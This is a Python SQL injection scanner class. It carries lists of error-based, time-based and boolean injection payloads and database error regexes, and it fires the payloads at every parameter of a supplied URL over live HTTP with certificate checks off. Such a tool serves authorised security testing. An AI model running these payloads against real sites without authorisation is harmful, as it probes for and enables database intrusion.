"""
SQL Injection scanner with real detection.
"""
import requests
import re
import time
from typing import List, Dict, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

class SQLiScanner:
    def __init__(self):
        self.payloads = {
            "error_based": [
                "'", "''", "`", "\"", 
                "' OR '1'='1", "\" OR \"1\"=\"1",
                "' OR '1'='1' --", "' OR '1'='1' #",
                "1' ORDER BY 1--", "1' ORDER BY 10--",
                "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            ],
            "time_based": [
                "' OR SLEEP(5)--", "' OR pg_sleep(5)--",
                "'; WAITFOR DELAY '0:0:5'--",
                "' OR BENCHMARK(10000000,SHA1('test'))--",
            ],
            "boolean_based": [
                "' AND '1'='1", "' AND '1'='2",
                "' AND 1=1--", "' AND 1=2--",
            ]
        }
        
        self.error_patterns = [
            r"SQL syntax.*MySQL", r"Warning.*mysql_",
            r"PostgreSQL.*ERROR", r"Warning.*pg_",
            r"ORA-[0-9]+", r"Oracle.*Driver",
            r"SQL Server.*Driver", r"ODBC.*Driver",
            r"SQLite.*Error", r"sqlite3\.OperationalError",
            r"Unclosed quotation mark",
            r"quoted string not properly terminated",
        ]
    
    def scan_param(self, url: str, param: str, method: str = "GET") -> List[Dict]:
        """Scan single parameter for SQLi."""
        findings = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if param not in params:
            return findings
        
        original_value = params[param][0]
        
        # Error-based detection
        for payload in self.payloads["error_based"]:
            result = self._test_payload(url, param, original_value, payload, method)
            if result["vulnerable"]:
                findings.append({
                    "type": "sqli_error_based",
                    "url": url,
                    "parameter": param,
                    "payload": payload,
                    "evidence": result["evidence"],
                    "severity": "HIGH"
                })
                break  # One finding per type
        
        # Time-based detection
        for payload in self.payloads["time_based"]:
            result = self._test_time_based(url, param, original_value, payload, method)
            if result["vulnerable"]:
                findings.append({
                    "type": "sqli_time_based",
                    "url": url,
                    "parameter": param,
                    "payload": payload,
                    "evidence": f"Response delayed by {result['delay']}s",
                    "severity": "HIGH"
                })
                break
        
        return findings
    
    def _test_payload(self, url: str, param: str, orig: str, payload: str, method: str) -> Dict:
        """Test single payload."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [orig + payload]
        
        new_query = urlencode(params, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_query))
        
        try:
            if method == "GET":
                resp = requests.get(test_url, timeout=10, verify=False)
            else:
                resp = requests.post(url, data=params, timeout=10, verify=False)
            
            for pattern in self.error_patterns:
                match = re.search(pattern, resp.text, re.I)
                if match:
                    return {"vulnerable": True, "evidence": match.group(0)}
        except:
            pass
        
        return {"vulnerable": False}
    
    def _test_time_based(self, url: str, param: str, orig: str, payload: str, method: str) -> Dict:
        """Test time-based payload."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Baseline
        start = time.time()
        try:
            requests.get(url, timeout=10, verify=False)
        except:
            pass
        baseline = time.time() - start
        
        # With payload
        params[param] = [orig + payload]
        new_query = urlencode(params, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_query))
        
        start = time.time()
        try:
            requests.get(test_url, timeout=15, verify=False)
        except:
            pass
        test_time = time.time() - start
        
        if test_time - baseline > 4:  # 5s sleep, allow 1s variance
            return {"vulnerable": True, "delay": round(test_time - baseline, 2)}
        
        return {"vulnerable": False}
    
    def scan_url(self, url: str) -> List[Dict]:
        """Scan all parameters in URL."""
        findings = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param in params.keys():
            findings.extend(self.scan_param(url, param))
        
        return findings
